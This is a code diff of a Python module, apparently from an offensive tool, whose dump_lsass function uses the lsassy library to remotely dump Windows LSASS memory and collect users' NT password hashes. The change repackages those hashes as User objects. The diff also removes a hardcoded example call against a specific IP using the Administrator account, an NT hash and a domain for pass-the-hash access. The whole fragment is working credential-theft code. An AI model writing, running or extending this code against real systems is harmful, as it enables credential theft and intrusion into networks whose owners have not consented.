@@ -5,6 +5,8 @@ from lsassy.parser import Parser
 import logging
 import sys
 
+from pympacket.models.common import User
+
 def dump_lsass(target, username, domain, password='', nthash=''):
     logging.disable(sys.maxsize) # Disable lsassy logger (noisy)
 
@@ -58,12 +60,12 @@ def dump_lsass(target, username, domain, password='', nthash=''):
         if current_creds not in unique_creds:
             if current_creds['nthash'] != None:
                 unique_creds.append(current_creds)
+
+    output = []
+    for user in unique_creds:
+        current_user = User()
+        current_user.username = user['username']
+        current_user.nthash = user['nthash']
+        output.append(current_user)
     
-    return unique_creds
-
-creds = dump_lsass(target="87.0.192.165", username="Administrator", nthash="58a478135a93ac3bf058a5ea0e8fdb71", domain="contoso.local")
-
-# Output is a list of dict in the following format, None if error:
-# [{'domain':'CONTOSO', 'username':'Administrator', 'nthash':'58a478135a93ac3bf058a5ea0e8fdb71'}]
-for entry in creds:
-    print(entry)
+    return output
